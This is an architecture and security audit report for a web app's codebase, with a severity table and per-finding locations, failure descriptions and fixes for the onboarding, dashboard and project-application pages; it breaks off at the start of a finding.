# TFN Architecture Audit — Part 2: Per-section findings

Audited against current `main` (9d772cd) — **837 verified findings across 46 sections**.
Severity: **179 High · 430 Medium · 228 Low**. Each finding is CONFIRMED or PLAUSIBLE (adversarially re-checked against the code).

| Section | High | Med | Low |
|---|---|---|---|
| Edge: Auth & session | 11 | 9 | 4 |
| Edge: Email pipeline (part 1/2 — dispatch & health) | 7 | 14 | 5 |
| Auth feature: engine, domain, ports, adapters & flows | 7 | 13 | 4 |
| Edge: Fleety AI (part 2/2 — knowledge ingestion & content) | 6 | 12 | 6 |
| Edge: Notifications & push | 6 | 13 | 5 |
| Profile, onboarding, projects, applications & certification components | 6 | 12 | 4 |
| Edge: Consent, privacy & DSAR | 6 | 9 | 4 |
| Core lib: data access, db, query & domain helpers | 6 | 9 | 3 |
| Edge: Email pipeline (part 2/2 — send, suppression & webhooks) | 6 | 7 | 4 |
| Hooks | 5 | 19 | 5 |
| Auth feature: services, testing & UI | 5 | 12 | 6 |
| Design system: molecules | 5 | 12 | 4 |
| Edge: Discord integration | 5 | 7 | 8 |
| Classes, cohorts, curriculum & course pages | 5 | 8 | 6 |
| Services | 5 | 9 | 5 |
| Auth, MFA & route-guard components | 5 | 9 | 3 |
| Edge shared utilities & Supabase config/tests | 4 | 15 | 9 |
| App contexts, config, static data & integrations | 4 | 14 | 6 |
| Edge: Freescout & support | 4 | 12 | 8 |
| Auth, account, onboarding, journey & dashboard pages | 4 | 9 | 9 |
| System-health dashboard components | 4 | 11 | 5 |
| Admin components | 4 | 11 | 4 |
| Edge: i18n, content, public & handoff endpoints | 4 | 10 | 5 |
| Edge: Fleety AI (part 1/2 — chat, embeddings & review) | 4 | 6 | 7 |
| Edge: Security, rate-limit & ops | 4 | 6 | 6 |
| Database schema, RLS & migrations | 4 | 8 | 1 |
| App shell, layout, legal/consent, Fleety, editor & shared UI components | 4 | 4 | 1 |
| Catch-all: app entry, assets, generated, tests & repo tooling | 3 | 10 | 5 |
| Admin, system-health, design, legal & consent pages | 3 | 10 | 4 |
| Applications, forms, registration, agreements & feedback components | 3 | 12 | 2 |
| Quest, events, recruiting, profile, Fleety, auth & i18n components | 3 | 6 | 5 |
| Core lib: auth & consent modules | 3 | 6 | 1 |
| Edge: Roles, admin & certifications | 2 | 12 | 9 |
| Core lib: root utilities | 2 | 13 | 7 |
| Community, events, resources, notifications & Fleety pages | 2 | 12 | 7 |
| Projects, clients, applications & roster pages | 2 | 9 | 8 |
| Community, membership, notifications, PWA & dashboard components | 2 | 9 | 6 |
| Design system: theme, provider, tokens & tests | 2 | 8 | 7 |
| Class-curriculum, profile-setup & TAL-9000 features | 2 | 8 | 6 |
| Design system: organisms, primitives & layout | 2 | 6 | 7 |
| Design system: atoms | 2 | 4 | 5 |
| shadcn UI primitives & component tests | 2 | 2 | 0 |
| Core lib: Fleety AI modules | 1 | 7 | 6 |
| Core lib: validation, errors, observability & telemetry | 1 | 7 | 1 |
| Edge: Payments (Gumroad) & Airtable sync | 1 | 5 | 3 |
| Classes, courses, resources, projects & clients components | 1 | 4 | 2 |

---

## Auth, account, onboarding, journey & dashboard pages

### [High] WelcomeWizard writes profiles directly, bypassing ProfileService sanitization + allow-list (stored XSS / mass assignment)  `security` (CONFIRMED)
- **Where:** src/pages/WelcomeWizard.tsx:115-131 (saveCurrent) and :136-141,:151-154 (onboarded_at); contrast ProfileService.update deepSanitize at src/services/profile.service.ts:105-111 and updateFields allow-list at :158-201
- **What breaks:** saveCurrent does supabase.from('profiles').update({[field]: values[field]?.trim() || null}) for first_name, last_name, display_name, country and bio with NO deepSanitize and NO field allow-list — verified against ProfileService.update (line 106 deepSanitize) and updateFields (line 180 pickAllowedFields + 182 deepSanitize). display_name is 'what teammates see on cards and comments' (line 43); an unsanitized <img onerror>/<script> payload typed here is persisted verbatim and becomes stored XSS wherever display_name/bio is rendered. It is also a second uncontrolled writer of the profiles table, so any future column ProfileService protects is unprotected via this path.
- **Smallest fix:** Route every profiles write in WelcomeWizard through ProfileService.updateFields for the wizard's field set and add a dedicated markOnboarded method; delete the raw supabase.from('profiles').update calls.

### [High] ThirdStepsPage writes journey_progress directly; uncomplete hits the BEFORE-UPDATE guard and silently diverges UI from DB  `error-handling` (CONFIRMED)
- **Where:** src/pages/ThirdStepsPage.tsx:111-136 (toggleLesson) and :64-79 (load); contrast JourneyService.upsertTask at src/services/journey.service.ts:154-236
- **What breaks:** toggleLesson calls supabase.from('journey_progress').upsert({completed:false, completed_at:null}) directly inside try/finally with NO catch and NO `if (error)` check. Verified in journey.service.ts:176-192 that uncompletion MUST go through the mark_task_incomplete SECURITY DEFINER RPC, which sets app.allow_uncomplete=true so the BEFORE-UPDATE guard permits clearing completed/completed_at. ThirdSteps bypasses that RPC, so the uncomplete upsert is rejected by the guard, the error is swallowed, local completedSet is flipped anyway (line 128), the query cache is invalidated (131-132) and refetched showing still-complete — the checkbox won't stick across reload. It also bypasses the VALID_TASK_IDS whitelist (journey.service.ts:160) and the 2s dedupe (:200); and the load .then (line 71) has no error branch, so a failed fetch shows a returning user zero progress and lets them re-complete lessons.
- **Smallest fix:** Replace the raw read/upsert with JourneyService.getProgress and JourneyService.upsertTask (as FirstStepsPage already does), and add a verb+object ConfirmDialog before uncompleting to match §2B1 (FirstStepsPage:562-575).

### [High] Two onboarding wizards write overlapping profile fields with two different 'onboarded' signals  `ownership` (CONFIRMED)
- **Where:** src/pages/WelcomeWizard.tsx:118-141 (raw update, sets profiles.onboarded_at) vs src/pages/ProfileSetupPage.tsx:214,231 (ProfileService.update + JourneyService.upsertTask 'first_steps'/'profile'); ProfileService.update sets profile_completed + derives display_name at profile.service.ts:91,93
- **What breaks:** ProfileSetupPage (/profile-setup) and WelcomeWizard (/welcome) both collect first_name, last_name and country, but ProfileSetup DERIVES display_name from first+last (profile.service.ts:91) and sets profile_completed=true (:93) plus the first_steps/profile journey row, while WelcomeWizard lets the user set display_name LITERALLY and sets only onboarded_at. There is no single owner of display_name (one derives it, one takes it literally — they overwrite each other) and three competing 'is onboarded' facts (profile_completed vs onboarded_at vs the journey row). A user onboarded via /welcome has onboarded_at but no profile_completed and no first_steps/profile row, so gating keyed on the other fact re-prompts them.
- **Smallest fix:** Pick one onboarding writer and one canonical 'onboarded' fact; have the other flow call the same service method. Make display_name ownership explicit (always derived or always user-set) and collapse profile_completed/onboarded_at to one column.

### [High] DashboardPage queries projects and clients tables directly in an inline queryFn, dropping errors  `boundary` (CONFIRMED)
- **Where:** src/pages/DashboardPage.tsx:221-237 (projectLookup useQuery hitting supabase.from('projects') and supabase.from('clients'))
- **What breaks:** The dashboard reaches past the hook/service layer straight to two tables in an inline queryFn. Both destructure only { data } (lines 226-227, 229-231) and drop { error }: if projects or clients select fails (RLS change, schema drift, transient PGRST002) the code falls back to [] and every application card renders clientName 'Client' (line 554: client?.name ?? 'Client') with no error surfaced — wrong/blank client names, no failure signal. It also duplicates project/client lookup logic that belongs in a service, so no other consumer can reuse it.
- **Smallest fix:** Move this lookup into a data hook backed by a service (ProjectsService.getByIds / ClientsService.getByIds) that checks and reports the error; consume it from the page.

### [Medium] Dashboard self-heals the connect-discord task from profile.discord_user_id — a data-ownership conflict patched in React  `ownership` (CONFIRMED)
- **Where:** src/pages/DashboardPage.tsx:255-259 (hasLinkedDiscord / allConnectDiscordDone)
- **What breaks:** Completion of 'Connect to Discord' has two sources of truth: the journey_progress row and profiles.discord_user_id. The comment (255-257) admits they disagree for older users, and the fix is applied client-side by OR-ing them (line 259: connectDiscordCompleted >= TOTAL_CONNECT_DISCORD || hasLinkedDiscord). Every other reader of journey_progress (edge functions, ConnectDiscordPage, reporting) that does not replicate this OR sees the user as not-done, so gating/notifications drift by surface. Patching a data-layer inconsistency in one component guarantees the others stay wrong.
- **Smallest fix:** Fix it at the data layer: backfill/trigger the journey_progress connect-discord row when discord_user_id is set, so all readers agree; then remove the client-side OR.

### [Medium] Discord OAuth callback treats a post-link finalize failure as a link failure — user retries an already-linked account  `error-handling` (CONFIRMED)
- **Where:** src/pages/DiscordOAuthCallbackPage.tsx:65-89
- **What breaks:** completeDiscordOAuth binds the account server-side (line 66); the following finalizeDiscordLink (Community role, avatar, journey task) runs in the SAME try (67-75). If completeDiscordOAuth succeeds but finalizeDiscordLink throws, the block jumps to setPhase('error') (line 83) with 'Couldn't link Discord'. The account IS linked, but the user is told it failed and pushed to 'Back to try again' — the retry re-runs the OAuth exchange against an already-consumed code/already-linked identity and fails again, leaving a permanently broken-looking flow while the link silently worked. Raw err.message is also surfaced to the user (line 85-87).
- **Smallest fix:** Separate the phases: if completeDiscordOAuth succeeded, always show success and run finalize as best-effort with its own non-blocking toast; never roll the whole page into 'error' on a finalize hiccup. Show a generic message, not raw err.message.

### [Medium] ProfileSetup onboarding workflow is trapped in the submit handler with floating Discord promises and no retry idempotency  `boundary` (CONFIRMED)
- **Where:** src/pages/ProfileSetupPage.tsx:213-268 (handleSubmit)
- **What breaks:** A multi-step workflow (ProfileService.update, set_my_marketing_subscription RPC, JourneyService.upsertTask, ProfileService.fetch, two DiscordNotifyService calls, generate-discord-invite edge) lives inline in the handler. DiscordNotifyService.profileCompleted/taskCompleted (lines 236-242) are neither awaited nor caught — floating promises. navigate() runs only at the very end (line 262), so if any middle step (e.g. ProfileService.fetch line 234) throws, the catch sets errors.general and the user is stuck on the setup page even though the profile already saved. Re-submitting re-runs set_my_marketing_subscription (220) and re-fires the profileCompleted announcement — duplicate EO sync and duplicate community announcements, because nothing is idempotent. It also calls supabase.rpc and supabase.functions.invoke directly from the component (220, 249).
- **Smallest fix:** Extract OnboardingService.completeProfileSetup that runs the steps in order, guards the marketing/notification steps for idempotency, and reports failures; await or explicitly .catch the notify calls; move the raw rpc/invoke behind services.

### [Medium] EditProfilePage calls export_my_data RPC and delete-account edge directly from the component  `dependency` (CONFIRMED)
- **Where:** src/pages/EditProfilePage.tsx:632-650 (export_my_data + inline blob/anchor download) and :260-279 (delete-account via supabase.functions.invoke with hand-built Authorization header)
- **What breaks:** GDPR data-export and account-deletion — both consequential, auditable operations — are wired straight to supabase.rpc/functions.invoke inside onClick handlers, with DOM blob-download logic inlined in JSX. This bypasses invokeEdge (used by ConfirmAdminPage:80, which centralizes auth + 410/403/401 error classification); here the bearer token is assembled by hand (getSessionSafe + manual header, lines 264-267), so there are two divergent edge-invocation mechanisms. The export catch (647-649) is a bare toast with no reporting. Business/IO logic in a component cannot be reused or tested, and the hand-rolled auth header can drift from invokeEdge's contract.
- **Smallest fix:** Add AccountService.exportMyData() and AccountService.deleteAccount() that call through invokeEdge; the component just calls them and renders the result.

### [Medium] FirstStepsPage progress load has no error handling — a failed fetch shows a completed user as blank and can re-fire notifications  `error-handling` (CONFIRMED)
- **Where:** src/pages/FirstStepsPage.tsx:206-212 (JourneyService.getProgress(...).then with no catch)
- **What breaks:** getProgress throws on structural errors (journey.service.ts:83). Here .then (line 208) has no .catch, so a rejection is an unhandled promise and tasks stay all-incomplete with no error UI. A returning user who finished onboarding sees every task unchecked; if they re-click, toggleTask marks tasks complete again and fires DiscordNotifyService.taskCompleted/phaseCompleted a second time — duplicate 'onboarding complete' Discord announcements. There is no loading/error flag distinguishing 'not loaded' from 'zero progress'.
- **Smallest fix:** Handle the rejection (catch → error state + retry affordance) and gate task rendering on a loaded flag so incomplete state is never shown before progress resolves.

### [Medium] WelcomeWizard marks onboarded_at without checking the write — 'Welcome aboard' but DB not updated, causing a bounce loop  `error-handling` (CONFIRMED)
- **Where:** src/pages/WelcomeWizard.tsx:136-144 (handleNext last step) and :149-159 (handleSkip last step)
- **What breaks:** The final onboarded_at update result is discarded (no { error } check) in both handleNext (138-141) and handleSkip (151-154). If that write fails, handleNext still toasts 'Welcome aboard' and navigates to /dashboard (142-143). But the wizard's own gate (line 71: if profile?.onboarded_at → redirect to dashboard) only bounces away when onboarded_at is set — since it wasn't, the user's next visit lands back in the wizard with no error ever shown.
- **Smallest fix:** Check the error from the onboarded_at update; only toast success and navigate when it succeeded, otherwise surface an error and keep the user on the step.

### [Medium] Phase-completion Discord announcements are not idempotent and are computed from stale closure state  `error-handling` (CONFIRMED)
- **Where:** src/pages/FirstStepsPage.tsx:266-277,340-350 and src/pages/ThirdStepsPage.tsx:98-109
- **What breaks:** Both pages fire DiscordNotifyService.phaseCompleted the moment the last task flips complete. Neither persists a 'phase-complete already announced' flag; the guards (completionShownRef FirstSteps:194,271; prevCompletedCountRef ThirdSteps:61,108) are in-memory only. Marking the final task incomplete then complete again re-satisfies the condition and re-posts the announcement to Discord. In FirstSteps the all-complete count is derived from the possibly-stale `tasks` closure (line 267: tasks.filter(t => t.id!==id ? t.completed : true)), so under rapid clicks the announcement can fire at the wrong moment. ThirdSteps' initial-null guard (108) correctly suppresses the first render, but re-completion after uncomplete still refires.
- **Smallest fix:** Make phase completion server-owned and idempotent (the notify/edge function no-ops if already announced), and derive the completion check from the authoritative post-write state, not the pre-write closure.

### [Medium] DashboardPage renders an infinite skeleton with no error/retry when the overview RPC or count queries fail structurally  `error-handling` (PLAUSIBLE)
- **Where:** src/pages/DashboardPage.tsx:172,179-195 (overviewReady) and :393-409 (skeleton branch)
- **What breaks:** (added-in-verification) overviewReady (191-195) is true only when overview !== undefined AND all three useCompletedCount .data !== undefined. On a structural failure (RLS denial, schema drift — the exact class getProgress/getCompletedCount rethrow as non-transient in journey.service.ts:136-146), those query.data values stay undefined forever, so overviewReady never flips and the core-courses section (395) renders the loading skeleton (399-409) indefinitely with no error state, no retry affordance, and aria-busy stuck true. A returning user whose progress can't load sees a permanent spinner instead of an error they can act on. The same undefined-on-error path also means phaseCounts stays {} so completed second/third-step users regress to 0/'not started' if only the overview RPC errors.
- **Smallest fix:** Track the query error/isError states and render an inline error-with-retry for the core-courses section instead of leaving overviewReady false forever; distinguish 'failed' from 'still loading'.

### [Medium] WelcomeWizard onboarding never satisfies the FirstSteps 'profile' task, so /welcome users are re-prompted to set up their profile  `ownership` (CONFIRMED)
- **Where:** src/pages/WelcomeWizard.tsx:133-159 (finish/skip) vs src/pages/FirstStepsPage.tsx:56-65,116-121 ('profile' task → /profile-setup) and src/pages/ProfileSetupPage.tsx:231 (only ProfileSetup marks first_steps/profile)
- **What breaks:** (added-in-verification) The FirstStepsPage checklist contains a 'profile' task (FIRST_STEPS_TASK_IDS line 62, card links to /profile-setup line 120) that is marked complete ONLY by ProfileSetupPage's JourneyService.upsertTask(user.id,'first_steps','profile',true) at line 231. WelcomeWizard collects the same profile data (first_name/last_name/display_name/country/bio) and marks onboarded_at, but never writes the 'profile' journey row. So a user who completes /welcome still sees 'Set Up Profile' incomplete on FirstStepsPage and must redo profile setup at /profile-setup — two flows collect the same fields and neither satisfies the other's completion signal. This is the concrete broken path behind the 'no single onboarded fact' ownership drift.
- **Smallest fix:** Have WelcomeWizard's finish step call the same JourneyService.upsertTask(...,'first_steps','profile',true) and set profile_completed via ProfileService, or route both flows through one shared onboarding-completion service.

### [Low] navigate() called during render in QuestDetailPage and WelcomeWizard  `other` (CONFIRMED)
- **Where:** src/pages/QuestDetailPage.tsx:80-83 and src/pages/WelcomeWizard.tsx:110-113
- **What breaks:** Both call navigate(...) directly in the render body (not in an effect) and return null. React warns about state updates during render of another component. In QuestDetailPage the not-subscribed redirect (80-83) fires imperatively; note the transient-empty concern is bounded because selectionsLoading gates render at line 54 (isSubscribed derives from `selections`, which IS gated) — but useAllQuestSteps/useSelfReportProgress/useAllJourneyProgress are not gated by their loading state, so completedPathSlugs can compute against partial data on first paint. WelcomeWizard:110-113 does the same navigate-in-render for the unauthenticated case.
- **Smallest fix:** Move the redirect into a useEffect gated on fully-loaded data, or return a declarative <Navigate replace/>.

### [Low] ConfirmAdminPage and ConfirmTeacherPage are near-identical duplicated files  `under-engineering` (CONFIRMED)
- **Where:** src/pages/ConfirmAdminPage.tsx (167 lines) vs src/pages/ConfirmTeacherPage.tsx
- **What breaks:** Verified ConfirmAdminPage: the Shell component (17-25), the Status union (14-15), the token/loading/not-signed-in gates (35-75), the onConfirm 410/403/401 error mapping (94-105), and the success/error render (108-150) are structurally copy-pasted; only display strings, the edge-function name ('confirm-admin-role'), and the post-confirm link differ. Two copies drift: a fix to the auth-safety or error-mapping logic in one (e.g. adding a new status code) silently will not reach the other.
- **Smallest fix:** Extract a shared ConfirmRolePage(config) component parameterized by function name, copy, and success link; render both pages from it.

### [Low] Membership 'waitlist' action shows a success toast but persists nothing  `other` (CONFIRMED)
- **Where:** src/pages/EditProfilePage.tsx:573-579 (onSelect intent.action === 'waitlist')
- **What breaks:** Selecting a waitlist tier toasts "Thanks! We'll let you know when … is ready" (574-577) but makes no backend call — no row is written anywhere. The user believes they joined a waitlist; there is no record, so no one will ever be notified. It is a success message for an operation that did not happen.
- **Smallest fix:** Persist the waitlist intent via a service/edge call before showing success, or change the copy to reflect that nothing was recorded.

### [Low] WelcomeWizard fetches and stores readiness that is never rendered, plus a no-op canAdvance and unused label maps  `over-engineering` (CONFIRMED)
- **Where:** src/pages/WelcomeWizard.tsx:82-87 (readiness fetch), :98-101 (canAdvance always true), :29-46 (FIELD_LABELS/FIELD_HELP entries beyond STEP_FIELDS)
- **What breaks:** The v_profile_readiness query (82-87) runs on every wizard mount and its result is stored in `readiness` state that no JSX consumes (CompletenessMeter at line 171 fetches its own data) — a wasted round-trip and dead state. canAdvance (98-101) is a useMemo hard-coded to true feeding disabled={!canAdvance} (209) — dead abstraction. FIELD_LABELS/FIELD_HELP carry timezone/avatar_url/discord_username entries the 5-step STEP_FIELDS never uses. The `as never` cast (line 83) removes compile-time safety if the view changes.
- **Smallest fix:** Delete the unused readiness fetch/state and the canAdvance no-op; trim the label maps to STEP_FIELDS; if readiness is needed, render it and type the view properly.

### [Low] ThirdStepsPage hand-rolls a markdown parser inside the component  `under-engineering` (CONFIRMED)
- **Where:** src/pages/ThirdStepsPage.tsx:152-210 (renderContent)
- **What breaks:** ~60 lines of bespoke string-splitting render bold/lists/paragraphs in the page (154-209). The repo already ships an html lib (DashboardPage:35 imports stripHtml from @/lib/html). The hand-rolled parser mishandles common cases (inline bold mid-heading, nested/mixed lists, ** inside list content) and is duplicated formatting logic that belongs in a shared, tested util or a markdown renderer.
- **Smallest fix:** Replace renderContent with the shared markdown/html utility used elsewhere, or extract it to a tested lib module.

### [Low] DashboardPage imports data constants from sibling page modules, coupling pages and undermining code-splitting  `dependency` (CONFIRMED)
- **Where:** src/pages/DashboardPage.tsx:30-31 (imports TOTAL_FIRST_STEPS/FIRST_STEPS_TASK_IDS from @/pages/FirstStepsPage and TOTAL_CONNECT_DISCORD/CONNECT_DISCORD_TASK_IDS from @/pages/ConnectDiscordPage)
- **What breaks:** Reaching into another route's module for exported constants (FIRST_STEPS_TASK_IDS is defined at FirstStepsPage.tsx:56) couples the dashboard to page internals and pulls those page modules into the dashboard's import graph, defeating route-level lazy loading. A change to FirstStepsPage's internals ripples into the dashboard bundle, and the 'canonical task IDs' fact has no neutral home.
- **Smallest fix:** Move FIRST_STEPS_TASK_IDS / CONNECT_DISCORD_TASK_IDS and their totals into a shared data module (e.g. src/data/journey.ts) and import from there in both the pages and the dashboard.

### [Low] (profile as any) casts in ProfileSetup/EditProfile suppress type-checking on fields that are actually typed  `other` (CONFIRMED)
- **Where:** src/pages/ProfileSetupPage.tsx:118,122,125 and src/pages/EditProfilePage.tsx:99,103; fields declared on Profile at src/services/profile.service.ts:24,28,30
- **What breaks:** scheduling_url, notify_announcements and has_discord_account are declared on the Profile type (profile.service.ts:24,28,30), yet both pages read them via (profile as any) (ProfileSetup:118,122,125; EditProfile:99,103). The casts are unnecessary and dangerous: if any of these columns is renamed or dropped, the cast silences the compile error and the reads become undefined at runtime, silently blanking the user's saved values in the form.
- **Smallest fix:** Remove the `as any` casts and read the typed fields directly so the compiler catches drift.

### [Low] Inconsistent lazy-loading and edge-invocation abstractions across the section  `under-engineering` (CONFIRMED)
- **Where:** MyJourneyPage.tsx:1 uses React `lazy`; DashboardPage.tsx:2 uses lazyWithRetry; ConfirmAdminPage:6 uses invokeEdge while EditProfile:266 / ProfileSetup:249 use raw supabase.functions.invoke; Button imported from @/design-system (QuestDetailPage:3, ConfirmAdminPage:4) vs @/components/ui/button (WelcomeWizard:15, ThirdStepsPage:14)
- **What breaks:** MyJourneyPage's plain lazy() (line 1) has no chunk-load-failure retry, so after a Cloudflare Pages deploy a viewer holding a stale index hits an unrecoverable error boundary on tab switch, where the retry-wrapped pages (DashboardPage uses lazyWithRetry) self-heal. The two edge-call mechanisms mean auth/error handling is implemented twice and can diverge. Two Button import paths. These are the 'more than one way to do the same thing' drifts the guidelines warn against.
- **Smallest fix:** Standardize on lazyWithRetry for all route/tab lazy loads and invokeEdge for all edge calls; pick one Button import path.

### [Low] NotFound uses a full-page anchor reload and has a dead useLocation call  `under-engineering` (CONFIRMED)
- **Where:** src/pages/NotFound.tsx:4 (useLocation unused) and :11 (<a href="/">)
- **What breaks:** useLocation() is called (line 4) but its result is never used — dead code from a removed logging path. The 'Return to Home' link (line 11) is a raw <a href="/"> that triggers a full document reload inside the SPA, discarding React app state and re-downloading the bundle instead of a client-side route transition.
- **Smallest fix:** Remove the unused useLocation and replace the <a> with a React Router <Link to="/">.

---

## Projects, clients, applications & roster pages

### [High] Project-edit autosave writes UNVALIDATED full form state onto the live projects row every 30s  `boundary` (CONFIRMED)
- **Where:** src/pages/ProjectFormPage.tsx:451-471 (autosave.onSave) vs 430-446 (handleSubmit projectSchema.safeParse)
- **What breaks:** Confirmed. handleSubmit validates with projectSchema.safeParse (431) before writing, but the 30s autosave (enabled `isEditing && initialized`, 453 — NOT gated on validity or on which field changed) calls supabase.from('projects').update(sanitized) with only sanitizeRecordFields and ZERO schema validation. An admin who momentarily clears team_hats to re-pick roles (or blanks timezone_range, discord_role_id, client_id) has that invalid state persisted 30s later to the live row. ProjectOpeningDetailPage then renders no roles and ProjectApplicationPage.availableHats (line 290-291) collapses to ALL TEAM_HATS defaults, so applicants to a real opening pick hats the project never offered. Autosave silently commits schema-invalid, half-edited states to production data 767 users see, with no Discord change-notification either (only manual save calls notifyProjectUpdate).
- **Smallest fix:** Run projectSchema.safeParse inside autosave.onSave and skip the write (or persist only the parsed subset) on failure; at minimum never autosave a form that would fail handleSubmit's own validation.

### [High] Project-application create flow has no idempotency — concurrent/duplicate inserts create duplicate rows that then break .single()/.maybeSingle() reads  `error-handling` (CONFIRMED)
- **Where:** src/pages/ProjectApplicationPage.tsx:321-340 (saveMutation insert), 486-509 (autosave insert), 429-434 (handleNext mutate+setStep without await)
- **What breaks:** Confirmed. When existingApp is null, both the step-1 saveMutation (329-339) and the autosave onSave (500-506) insert new project_applications rows, and handleNext step 1 fires `saveMutation.mutate(...)` then `setStep(2)` without awaiting (431-432). Autosave becomes enabled the moment step>1 (488); if it fires before the invalidation-driven refetch (343,507) repopulates existingApp, it inserts a SECOND row for the same (user_id, project_id). A fast double-click on Continue does the same. There is no client guard and no stated unique constraint. If (user_id, project_id) is not UNIQUE in the DB, duplicates are silent; then ProjectOpeningDetailPage.tsx:166-171 (.maybeSingle), ProjectApplicationPage.tsx:213-221 (.maybeSingle) and ProjectApplicationStatusPage.tsx:390-395 (.single) throw 'multiple (or no) rows returned', permanently breaking the apply page, the already-applied check, and the status page for that user.
- **Smallest fix:** Upsert on (user_id, project_id) with a DB unique constraint, disable Continue until the first insert resolves, and gate the autosave insert path on `!!existingApp` so only one writer ever creates the row.

### [Medium] Admin application-review page has no in-component/ownership authorization and leans entirely on client-side AdminRoute + unverified RLS  `security` (PLAUSIBLE)
- **Where:** src/pages/ApplicationSubmissionDetailPage.tsx:32-98 — route wrapped by AdminRoute at src/App.tsx:496-498; contrast src/pages/RosterApplicantDetailPage.tsx:39,69,196-203
- **What breaks:** CORRECTION to first pass: this page IS behind <AdminRoute> (App.tsx:496-498), which does a real client-side isAdmin check and Navigate('/access-denied') when !isAdmin — so the 'any of 767 members can enumerate and read PII' / IDOR claim is FALSE at the route level. The residual, real problem is narrower: unlike its sibling RosterApplicantDetailPage (which additionally gates every query with `enabled: … && isAdmin` and renders 'Access denied' in-component), this page has NO defense-in-depth guard and NO ownership scoping — it fetches project_applications by id alone (38-39), then profiles.select('*') (74-75) and the full general_applications answers (86-93). AdminRoute is client-only; the sole server-side authorization on this applicant PII is the RLS policy on project_applications/profiles/general_applications. If that RLS is permissive to `authenticated` (a common mistake — the whole admin surface here relies on it), a crafted PostgREST request outside the React app reads every applicant's PII and essays. The client guard cannot stop that.
- **Smallest fix:** Independently verify (and tighten) the RLS policies on project_applications, profiles, and general_applications so admin-only reads are enforced server-side, not just by AdminRoute. As defense-in-depth, add the `useAdmin()` + `enabled: … && isAdmin` gate this page's sibling already uses, and select explicit profile columns instead of '*'.

### [Medium] bounded-save probe compares projects.name, a column the form never sets — an indeterminate save can never resolve to 'persisted'  `error-handling` (CONFIRMED)
- **Where:** src/pages/ProjectFormPage.tsx:386-397 and 463-468 (probe compares data.name === sanitized.name); src/lib/data/bounded-save.ts:79-96 (probe runs only on timeout)
- **What breaks:** Confirmed. projectSchema has no `name` field (77-95; it uses friendly_name), so `values`/`sanitized` never carry a `name` key and sanitized.name is undefined. Both probes gate 'persisted' on `data.name === sanitized.name` (394, 467); data.name is the row's real name (or null), so the equality is always false → probe returns 'unresolved'. bounded-save.ts only calls the probe on timeout (79-83), so on a genuinely-persisted-but-slow save the anti-stranding probe throws SaveIndeterminateError instead of confirming. The admin sees 'We couldn't confirm the save. Please try again.' (420-424) and retries a write that already succeeded — re-firing the Discord update and re-writing the row. The entire anti-stranding feature is dead on this page.
- **Smallest fix:** Probe on a field the form actually writes (friendly_name, or project_status alone which is included) or compare a returned id/updated_at, not `name`.

### [Medium] Admin roster applicant counts silently under-count once completed applications exceed the PostgREST row cap  `under-engineering` (CONFIRMED)
- **Where:** src/pages/AdminRosterPage.tsx:54-69
- **What breaks:** Confirmed. The query selects every completed row (`.select('project_id, id').eq('status','completed')`, 57-60) with no range/pagination and tallies them in a client-side Map. PostgREST caps rows (default 1000). As 767 members apply to multiple projects over time, total completed applications will cross 1000; past that the query silently returns only the first page and every project's applicant count on the Recruiting Center reads too low with no error — coordinators make staffing decisions off under-counts. Also ships the whole table to the browser each load.
- **Smallest fix:** Use a server-side grouped aggregate (per-project `count:'exact', head:true`, or an RPC returning grouped counts) instead of pulling all rows and counting in JS.

### [Medium] Systemic layering violation + duplication: project/client/application table access is inlined into ~8 pages, re-implementing the same reads and label helpers  `boundary` (CONFIRMED)
- **Where:** MyProjectApplicationsPage.tsx:92-135; ProjectApplicationPage.tsx:140-226,321-339; ProjectApplicationStatusPage.tsx:387-485; ProjectFormPage.tsx:151-160,227-234; ApplicationSubmissionDetailPage.tsx:32-98; RosterApplicantDetailPage.tsx:42-152; AdminRosterPage.tsx:30-69; ProjectOpeningDetailPage.tsx:163-175
- **What breaks:** Confirmed. Dedicated services exist (GeneralApplicationService/JourneyService are imported and used in ApplicationsPage/ProjectTrainingPage), but there is no ProjectApplicationService/ProjectService — every page reaches supabase.from(...) directly for projects/clients/project_applications/profiles. The identical profiles.select('*').eq('user_id',…) block, the identical completed-general_application query, and the typeLabel/phaseLabel/statusLabel trio are copy-pasted across nearly every file (label helpers duplicated at MyProjectApplicationsPage:27-29, ProjectApplicationStatusPage, ApplicationSubmissionDetailPage:23-25, ProjectOpeningDetailPage:33-35, ProjectOpeningsPage:178-180, AdminRosterPage:11-12). No single owner for 'load an application + project + client + applicant', so a column rename or RLS/shape change must be fixed in a dozen places and they drift — and they already differ in whether they filter by user_id, which is exactly the inconsistency behind the missing in-component guard on ApplicationSubmissionDetailPage.
- **Smallest fix:** Introduce React Query hooks / a ProjectApplicationService that own these fetches + enrichment and have all pages call them; centralize the label maps in project-constants and delete the inline copies.

### [Medium] Two pages hand-roll raw fetch() to edge functions with duplicated env/apikey wiring instead of supabase.functions.invoke  `dependency` (CONFIRMED)
- **Where:** src/pages/ProjectOpeningDetailPage.tsx:135-160 and src/pages/ProjectOpeningsPage.tsx:74-85
- **What breaks:** Confirmed. Both build a URL from import.meta.env.VITE_SUPABASE_URL, attach VITE_SUPABASE_PUBLISHABLE_KEY as an apikey header by hand, and call fetch() — duplicating what supabase.functions.invoke already does through the one configured client (which AdminIngestPage correctly uses). ProjectOpeningDetailPage additionally does it in a manual useState/useEffect (131-160) instead of React Query, with NO AbortController and NO reset on projectId change: loading is only initialized true (132) and never reset when projectId changes, and there is no cleanup, so navigating between openings shows stale data while fetching, a late/stale response calls setData/setLoading after the id changed or the component unmounts, and a prior error is never cleared. Env/header logic in two places will drift from the client's real auth config.
- **Smallest fix:** Call these via supabase.functions.invoke('public-project-detail'|'public-project-openings', …) inside a useQuery keyed on projectId; drop the manual env/header/fetch and the hand-rolled loading state (ProjectOpeningsPage already wraps its fetch in useQuery — port that shape and drop the manual header).

### [Medium] Course prerequisite check is a floating promise with no catch — a rejected fetch strands the page on 'loading' forever  `error-handling` (CONFIRMED)
- **Where:** src/pages/ProjectTrainingPage.tsx:18-24
- **What breaks:** Confirmed. JourneyService.getCompletedCount(user.id,'second_steps').then(count => { setPrereqMet(...); setPrereqLoaded(true); }) has no .catch (20-23). If the call rejects (network blip, auth expiry, RLS error), prereqLoaded never becomes true, so GenericCoursePage's prerequisite gate (fed prereqLoaded at 42) stays in its loading/locked state indefinitely — permanent spinner/locked course with no error, no retry, surfacing only as an unhandled rejection in the console.
- **Smallest fix:** Add .catch that reportError()s and sets prereqLoaded=true (fail to an error/locked state) so the page can recover.

### [Medium] Bulk ingest shows a green success toast even when every dataset failed  `error-handling` (CONFIRMED)
- **Where:** src/pages/AdminIngestPage.tsx:74-81 (ingestAll) and 120-127 (syncReferenceAll)
